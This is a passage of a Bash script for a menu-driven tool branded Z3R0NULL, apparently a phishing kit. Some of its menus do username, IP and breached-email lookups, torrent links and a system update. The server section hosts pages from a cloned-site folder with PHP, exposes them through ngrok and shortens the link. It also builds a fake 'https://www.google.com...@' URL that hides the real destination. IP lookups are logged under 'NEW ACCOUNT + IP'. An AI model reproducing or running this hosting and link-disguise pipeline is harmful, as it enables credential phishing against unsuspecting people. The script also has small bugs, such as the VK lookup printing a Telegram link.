    if [[ ${pages_torrents_files} == "01" ]] || [[ ${pages_torrents_files} == "1" ]];then
    xdg-open https://1337x.to > /dev/null 2>&1
    pages_torrents_files
    elif [[ ${pages_torrents_files} == "02" ]] || [[ ${pages_torrents_files} == "2" ]];then
    xdg-open https://1337x.st > /dev/null 2>&1
    pages_torrents_files
    elif [[ ${pages_torrents_files} == "03" ]] || [[ ${pages_torrents_files} == "3" ]];then
    xdg-open https://thepiratebay.org/index.html > /dev/null 2>&1
    pages_torrents_files
    elif [[ ${pages_torrents_files} == "04" ]] || [[ ${pages_torrents_files} == "4" ]];then
    xdg-open https://nyaa.si > /dev/null 2>&1
    pages_torrents_files
    elif [[ ${pages_torrents_files} == "05" ]] || [[ ${pages_torrents_files} == "5" ]];then
    xdg-open https://katcr.to > /dev/null 2>&1
    pages_torrents_files
    elif [[ ${pages_torrents_files} == "00" ]] || [[ ${pages_torrents_files} == "0" ]];then
    pages_menu
    else
    clear
    banner
    error_404
    sleep 1
    pages_torrents_files
    fi
}

pages_contact(){
    clear
    banner
    echo -e "${bluebold}[* SELECT CONTACT OPTION *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Send Mail${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Instagram${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] Github${reset}"
    echo -e "${bluebold}[${reset}04${bluebold}] Youtube${reset}"
    echo -e "${bluebold}[${reset}05${bluebold}] Telegram${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' pages_contact

    if [[ ${pages_contact} == "01" ]] || [[ ${pages_contact} == "1" ]];then
    xdg-open XX > /dev/null 2>&1
    pages_contact
    elif [[ ${pages_contact} == "02" ]] || [[ ${pages_contact} == "2" ]];then
    xdg-open XX > /dev/null 2>&1
    pages_contact
    elif [[ ${pages_contact} == "03" ]] || [[ ${pages_contact} == "3" ]];then
    xdg-open XX > /dev/null 2>&1
    pages_contact
    elif [[ ${pages_contact} == "04" ]] || [[ ${pages_contact} == "4" ]];then
    xdg-open XX > /dev/null 2>&1
    pages_contact
    elif [[ ${pages_contact} == "05" ]] || [[ ${pages_contact} == "5" ]];then
    xdg-open XX > /dev/null 2>&1
    pages_contact
    elif [[ ${pages_contact} == "00" ]] || [[ ${pages_contact} == "0" ]];then
    pages_menu
    else
    clear
    banner
    error_404
    sleep 1
    pages_contact
    fi
}

osint_menu(){
    clear
    banner
    echo -e "${bluebold}[* SELECT OSINT *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] Check Username${reset}"
    echo -e "${bluebold}[${reset}02${bluebold}] Check IP${reset}"
    echo -e "${bluebold}[${reset}03${bluebold}] Check Hacked Email${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' osint_menu

    if [[ ${osint_menu} == "01" ]] || [[ ${osint_menu} == "1" ]];then
    osint_check_username
    elif [[ ${osint_menu} == "02" ]] || [[ ${osint_menu} == "2" ]];then
    osint_check_ip
    elif [[ ${osint_menu} == "03" ]] || [[ ${osint_menu} == "3" ]];then
    osint_check_email
    elif [[ ${osint_menu} == "00" ]] || [[ ${osint_menu} == "0" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    osint_menu
    fi
}

osint_check_username(){
    clear
    banner
    echo -e "${bluebold}[* OSINT USERNAME *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter Username.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' osint_check_username

    clear
    banner
    echo -e "${bluebold}[* OSINT USERNAME *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Searching The Username:${reset} ${osint_check_username}"
    echo -e ""

    CHKINSTAGRAM=$(curl -s -H "Accept-Language: en" --data "q=${osint_check_username}" https://instausername.com/availability | grep -o 'is free';echo $?)
    if [[ ${CHKINSTAGRAM} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Instagram Found:${reset} https://www.instagram.com/${osint_check_username}"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Instagram Not Found"
    fi
    echo -e ""
    CHKFACEBOOK=$(curl -s -H "Accept-Language: en" "https://api.instantusername.com/check/facebook/${osint_check_username}" -L | grep -o '"available":true';echo $?)
    if [[ ${CHKFACEBOOK} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Facebook Found:${reset} https://www.facebook.com/${osint_check_username}"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Facebook Not Found"
    fi
    echo -e ""
    CHKTWITTER=$(curl -s -H "Accept-Language: en" "https://nitter.net/${osint_check_username}" -L | grep -o 'not found';echo $?)
    if [[ ${CHKTWITTER} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Twitter Found:${reset} https://www.twitter.com/${osint_check_username}"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Twitter Not Found"
    fi
    echo -e ""
    CHKREDDIT=$(curl -s --request GET --url "https://www.reddit.com/user/${osint_check_username}" -H "Accept-Language: en" -L --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" | grep -o 'Sorry, nobody on Reddit goes by that name.';echo $?)
    if [[ ${CHKREDDIT} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Reddit Found:${reset} https://www.reddit.com/user/${osint_check_username}"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Reddit Not Found"
    fi
    echo -e ""
    CHKBLOGGER=$(curl -s -H "Accept-Language: en" "https://${osint_check_username}.blogspot.com" -L  --write-out '%{http_code}'  --silent --output /dev/null | grep -o '404';echo $?)
    if [[ ${CHKBLOGGER} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Blogger Found:${reset} https://${osint_check_username}.blogspot.com"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Blogger Not Found"
    fi
    echo -e ""
    CHKGITHUB=$(curl -s -H "Accept-Language: en" "https://www.github.com/${osint_check_username}" -L | grep -o 'Not Found';echo $?)
    if [[ ${CHKGITHUB} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] GitHub Found:${reset} https://www.github.com/${osint_check_username}"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Github Not Found"
    fi
    echo -e ""
    CHKWORDPRESS=$(curl -s -H "Accept-Language: en" "https://${osint_check_username}.wordpress.com" -L | grep -o 'Do you want to register\|that site is reserved';echo $?)
    if [[ ${CHKWORDPRESS} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Wordpress Found:${reset} https://${osint_check_username}.wordpress.com"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Wordpress Not Found"
    fi
    echo -e ""
    CHKSTEAM=$(curl -s -H "Accept-Language: en" "https://steamcommunity.com/id/${osint_check_username}" -L | grep -o 'The specified profile could not be found';echo $?)
    if [[ ${CHKSTEAM} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Steam Found:${reset} https://steamcommunity.com/id/${osint_check_username}"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Steam Not Found"
    fi
    echo -e ""
    CHKVIMEO=$(curl -s -H "Accept-Language: en" "https://vimeo.com/${osint_check_username}" -L | grep -o 'Sorry, we couldn’t find that page';echo $?)
    if [[ ${CHKVIMEO} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Vimeo Found:${reset} https://vimeo.com/${osint_check_username}"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Vimeo Not Found"
    fi
    echo -e ""
    CHKPASTEBIN=$(curl -s -H "Accept-Language: en" "https://pastebin.com/u/${osint_check_username}" -L | grep -o 'Not Found (#404)';echo $?)
    if [[ ${CHKPASTEBIN} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Pastebin Found:${reset} https://pastebin.com/u/${osint_check_username}"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Pastebin Not Found"
    fi
    echo -e ""
    CHKTIKTOK=$(curl -s -H "Accept-Language: en" "https://api.instantusername.com/check/tiktok/${osint_check_username}" -L | grep -o '"available":true';echo $?)
    if [[ ${CHKTIKTOK} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Tiktok Found:${reset} https://tiktok.com/@${osint_check_username}"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Tiktok Not Found"
    fi
    echo -e ""
    CHKTWITCH=$(curl -s --request GET --url "https://m.twitch.tv/${osint_check_username}" -H "Accept-Language: en" -L --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" | grep -o "Sorry, that page is in another castle";echo $?)
    if [[ ${CHKTWITCH} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Twitch Found:${reset} https://twitch.tv/${osint_check_username}"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Twitch Not Found"
    fi
    echo -e ""
    CHKSPOTIFY=$(curl -s -H "Accept-Language: en" "https://api.instantusername.com/check/spotify/${osint_check_username}" -L | grep -o '"available":true';echo $?)
    if [[ ${CHKSPOTIFY} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Spotify Found:${reset} https://open.spotify.com/user/${osint_check_username}"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Spotify Not Found"
    fi
    echo -e ""
    CHKTELEGRAM=$(curl -s -H "Accept-Language: en" "https://api.instantusername.com/check/telegram/${osint_check_username}" -L | grep -o '"available":true';echo $?)
    if [[ ${CHKTELEGRAM} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Telegram Found:${reset} https://t.me/${osint_check_username}"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Telegram Not Found"
    fi
    echo -e ""
    CHKVK=$(curl -s --request GET --url "https://vk.com/${osint_check_username}" -H "Accept-Language: en" -L --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" | grep -o '404 Not Found';echo $?)
    if [[ ${CHKVK} == *'1'* ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] VK Found:${reset} https://t.me/${osint_check_username}"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] VK Not Found"
    fi
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] MENU${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EXIT${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' osint_check_username
    if [[ ${osint_check_username} == "01" ]] || [[ ${osint_check_username} == "1" ]];then
    main_menu
    elif [[ ${osint_check_username} == "00" ]] || [[ ${osint_check_username} == "0" ]];then
    exit_script
    fi
}

osint_check_ip(){
    clear
    banner
    echo -e "${bluebold}[* OSINT IP *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter IP.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' osint_check_ip
    
    clear
    banner
    echo -e "${bluebold}[* OSINT IP *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] IP:${reset} ${osint_check_ip}"
    ipinfo=$(curl -s -L "http://ip-api.com/json/${osint_check_ip}?fields=continent,continentCode,country,countryCode,regionName,city,zip,lat,lon,timezone,currency,isp,org,as,asname,reverse,query" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > ${script_dir}/.files/IPINFO)
  
    query=$(grep -o '"query":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${query} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Hostname:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Hostname:${reset}" ${query}
    fi

    reverse=$(grep -o '"reverse":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${reverse} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Reverse:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Reverse:${reset}" ${reverse}
    fi
    
    continent=$(grep -o '"continent":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${continent} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Continent:${reset} Unknow"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Continent:${reset}" ${continent}
    fi

    continentcode=$(grep -o '"continentCode":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${continent} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Continent Code:${reset} Unknow"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Continent Code:${reset}" ${continentcode}
    fi

    country=$(grep -o '"country":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${country} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Country:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Country:${reset}" ${country}
    fi

    cc=$(grep -o '"countryCode":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${cc} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Country Code:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Country Code:${reset}" ${cc}
    fi
    
    rn=$(grep -o '"regionName":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${rn} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Region:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Region:${reset}" ${rn}
    fi

    city=$(grep -o '"city":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${city} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] City:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] City:${reset}" ${city}
    fi

    zip=$(grep -o '"zip":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${zip} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] ZIP:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] ZIP:${reset}" ${zip}
    fi

    tz=$(grep -o '"timezone":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${tz} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Time Zone:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Time Zone:${reset}" ${tz}
    fi

    currency=$(grep -o '"currency".*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${currency} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Currency:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] Currency:${reset}" ${currency}
    fi

    isp=$(grep -o '"isp".*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${isp} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] ISP:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] ISP:${reset}" ${isp}
    fi

    org=$(grep -o '"org":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${org} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] ORG:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] ORG:${reset}" ${org}
    fi
    
    as=$(grep -o '"as":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${as} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] AS:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] AS:${reset}" ${as}
    fi

    asname=$(grep -o '"asname":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f4)
    if [[ ${asname} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] AS Name:${reset} Unknown"
    else
    echo -e "${greenbold}[${reset}*${greenbold}] AS Name:${reset}" ${asname}
    fi

    lan=$(grep -o '"lat":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)
    lon=$(grep -o '"lon":.*' ${script_dir}/.files/IPINFO | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)
    if [[ ${lan} == "" || ${lon} == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Google Maps:${reset} Unknown"
    else
    link_maps="https://www.google.com/maps/place/${lan},${lon}"
    echo -e "${greenbold}[${reset}*${greenbold}] Google Maps:${reset}" ${link_maps}
    rm -rf ${script_dir}/.files/IPINFO
    fi   
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] MENU${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] EXIT${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' osint_check_ip
    if [[ ${osint_check_ip} == "01" ]] || [[ ${osint_check_ip} == "1" ]];then
    main_menu
    elif [[ ${osint_check_ip} == "00" ]] || [[ ${osint_check_ip} == "0" ]];then
    exit_script
    fi

    rm -rf ${script_dir}/.files/IPINFO > /dev/null 2>&1 &

    sleep 0.5

    save="
    [*] NEW ACCOUNT + IP [*]
    [*] Date: ${date}
    [*] Hour: $(date +"%H:%M")
    [*] IP: ${osint_check_ip}
    [*] Hostname: ${query}
    [*] Continent: ${continent}
    [*] Continent Code: ${continentcode}
    [*] Country: ${country}
    [*] Country Code: ${cc}
    [*] Region: ${rn}
    [*] City: ${city}
    [*] ZIP: ${zip}
    [*] Time Zone: ${tz}
    [*] Currency: ${currency}
    [*] ISP: ${isp}
    [*] ORG: ${org}
    [*] AS: ${as}
    [*] AS Name: ${asname}
    [*] Google Maps: ${link_maps}"
    echo "${save}" >> "${script_dir}/DATA/INFORMATION"
    cd ${script_dir}/ || exit_script
}

osint_check_email(){
    clear
    banner
    echo -e "${bluebold}[* OSINT EMAIL *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Enter Email.${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' osint_check_email
    
    CHK=$(curl -s -H "Accept-Language: en" --data "username=${osint_check_email}" https://usersearch.org/results_pwned.php | grep -zoP '(?<=<div class="results-item-icon">)(?s).*?(?=<div class="results-button-wrapper">)' > dump_mail.tmp)
    tidy -q dump_mail.tmp > dump_mail.html
    rm -rf dump_mail.tmp
    sed -i "/line 1/d" dump_mail.html
    clear
    banner
    echo -e "${bluebold}[* OSINT EMAIL *]${reset}"
    echo -e "${orangebold}"
    IDK=$(cat dump_mail.html | lynx -dump -stdin)
    sleep 1
    if [[ $IDK == "" ]];then
    echo -e "${greenbold}[${reset}*${greenbold}] Your Account Is Secure :D $Y."
    else
    echo -e "${redbold}[${reset}*${redbold}] Your Account As Been Hacked :c $N."
    echo -e ""
    echo -e "$IDK"
    fi
    rm -rf dump_mail.html
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] MENU${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' osint_check_email
    if [[ ${osint_check_email} == "01" ]] || [[ ${osint_check_email} == "1" ]];then
    main_menu
    elif [[ ${osint_check_email} == "00" ]] || [[ ${osint_check_email} == "0" ]];then
    osint_menu
    fi
}

#Update System
system_update(){
    clear
    banner
    echo -e "${bluebold}[* UPDATE SYSTEM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Starting Script...${reset}"
    echo -e ""
    sleep 1
    
    apt autoclean -y &>/dev/null
    clear
    banner
    echo -e "${bluebold}[* UPDATE SYSTEM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cleaning APT...${reset}"
    echo -e ""
    sleep 1
    
    apt autoremove -y &>/dev/null
    clear
    banner
    echo -e "${bluebold}[* UPDATE SYSTEM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cleaning APT           [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Removing Old Packets...${reset}"
    echo -e ""
    sleep 1
    
    apt update -y &>/dev/null
    clear
    banner
    echo -e "${bluebold}[* UPDATE SYSTEM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cleaning APT           [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Removing Old Packets   [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Updating Packets..."
    echo -e ""
    sleep 1
    
    apt upgrade -y &>/dev/null
    clear
    banner
    echo -e "${bluebold}[* UPDATE SYSTEM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cleaning APT           [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Removing Old Packets   [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Updating Packets       [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Packets..."
    echo -e ""
    sleep 1
    
    apt dist-upgrade -y &>/dev/null
    clear
    banner
    echo -e "${bluebold}[* UPDATE SYSTEM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cleaning APT           [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Removing Old Packets   [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Updating Packets       [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Packets      [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Distribution...${reset}"
    echo -e ""
    sleep 1
    
    apt full-upgrade -y &>/dev/null
    clear
    banner
    echo -e "${bluebold}[* UPDATE SYSTEM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cleaning APT           [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Removing Old Packets   [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Updating Packets       [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Packets      [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Distribution [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Full System...${reset}"
    echo -e ""
    sleep 1
    
    apt update &>/dev/null
    clear
    banner
    echo -e "${bluebold}[* UPDATE SYSTEM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cleaning APT           [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Removing Old Packets   [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Updating Packets       [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Packets      [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Distribution [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Full System  [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Updating New Packets...${reset}"
    echo -e ""
    sleep 1
    
    apt autoclean -y &>/dev/null
    clear
    banner
    echo -e "${bluebold}[* UPDATE SYSTEM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cleaning APT           [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Removing Old Packets   [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Updating Packets       [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Packets      [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Distribution [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Full System  [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Updating New Packets   [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Cleaning APT...${reset}"
    echo -e ""
    sleep 1
    
    apt autoremove -y &>/dev/null
    clear
    banner
    echo -e "${bluebold}[* UPDATE SYSTEM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cleaning APT           [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Removing Old Packets   [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Updating Packets       [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Packets      [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Distribution [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Full System  [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Updating New Packets   [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Cleaning APT           [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Removing Old Packets...${reset}"
    echo -e ""
    sleep 1
    
    clear
    banner
    echo -e "${bluebold}[* UPDATE SYSTEM *]${reset}"
    echo -e ""
    echo -e "${greenbold}[${reset}*${greenbold}] Cleaning APT           [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Removing Old Packets   [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Updating Packets       [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Packets      [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Distribution [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Upgrading Full System  [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Updating New Packets   [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Cleaning APT           [✔]${reset}"
    echo -e "${greenbold}[${reset}*${greenbold}] Removing Old Packets   [✔]${reset}"
    echo -e ""
    sleep 1
    clear
    reboot
}

#Reboot? (Y/N)
reboot(){
    clear
    banner
    echo -e "${redbold}[${reset}*${redbold}] REBOOT SYSTEM?${reset} ${whitebold}(Y/N)${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' reboot

    if [[ ${reboot} == "Y" ]] || [[ ${reboot} == "y" ]];then
    sh -c sudo reboot
    elif [[ ${reboot} == "N" ]] || [[ ${reboot} == "n" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    select_server
    fi
}

select_server(){
    clear
    banner
    echo -e "${bluebold}[* SELECT SERVER *]${reset}"
    echo -e ""
    echo -e "${bluebold}[${reset}01${bluebold}] NGROK"${reset}
    echo -e "${bluebold}[${reset}02${bluebold}] SSH${reset}"
    echo -e "${bluebold}[${reset}00${bluebold}] BACK${reset}"
    echo -e ""
    read -r -e -p $'\e[0;94m\e[1mZ3R0NULL-> \e[0m' select_server

    if [[ ${select_server} == "01" ]] || [[ ${select_server} == "1" ]];then
    ngrok_start
    elif [[ ${select_server} == "02" ]] || [[ ${select_server} == "2" ]];then
    ssh_start
    elif [[ ${select_server} == "00" ]] || [[ ${select_server} == "0" ]];then
    main_menu
    else
    clear
    banner
    error_404
    sleep 1
    select_server
    fi
}

#Start NGROK Server
ngrok_start(){

    if [[ ${site} == "ftp" ]];then
    rm -rf ${script_dir}/.sites/${site}/app/cache/ > /dev/null 2>&1 &
    fi

    clear
    banner
    php_starting
    sleep 3
    cd ${script_dir}/.sites/${site}/ || exit_script
    php -S ${host}:${port} > /dev/null 2>&1 &
    cd ${script_dir}/ || exit_script
    clear
    banner
    php_started
    sleep 2
    clear
    banner
    ngrok_starting
    sleep 3
    ${script_dir}/.files/ngrok http ${host}:${port} > /dev/null 2>&1 &
    clear
    banner
    ngrok_started
    sleep 2
    clear
    banner
    sleep 2
    link=$(curl -s -f http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^\"]*')
    shorturl=$(curl -s "http://tinyurl.com/api-create.php?url=${link}" | head -n1)
    ngrok_short_hidden=$(curl -s --data "url=${link}&shorturl=&opt=0" https://is.gd/create.php | html2text | grep "https" | head -n 1 | sed 's/\[//' | sed 's/\]//' | sed 's/https:\/\///')
	ngrok_short_hidden_result_google="https://www.google.com%7AGoogle%Oficial@${ngrok_short_hidden}"

    echo -e "${bluebold}[* NGROK *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Link Local:${reset} http://${host}:${port}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Online:${reset} ${link}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Short:${reset} ${shorturl}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Short Hidden Google:${reset} ${ngrok_short_hidden_result_google}"
    echo -e "${greenbold}[${reset}*${greenbold}] QR Code:${reset} ${script_dir}/QRCode.png"
    echo -e ""

    if [[ ${site} == "ftp" ]];then
    clear
    banner
    echo -e "${bluebold}[* NGROK *]${reset}"
    echo -e ""
    echo -e "${orangebold}[${reset}*${orangebold}] Link Local:${reset} http://${host}:${port}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Online:${reset} ${link}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Short:${reset} ${shorturl}"
    echo -e "${greenbold}[${reset}*${greenbold}] Link Short Hidden Google:${reset} ${ngrok_short_hidden_result_google}"
    echo -e "${greenbold}[${reset}*${greenbold}] QR Code:${reset} ${script_dir}/QRCode.png"
    echo -e ""
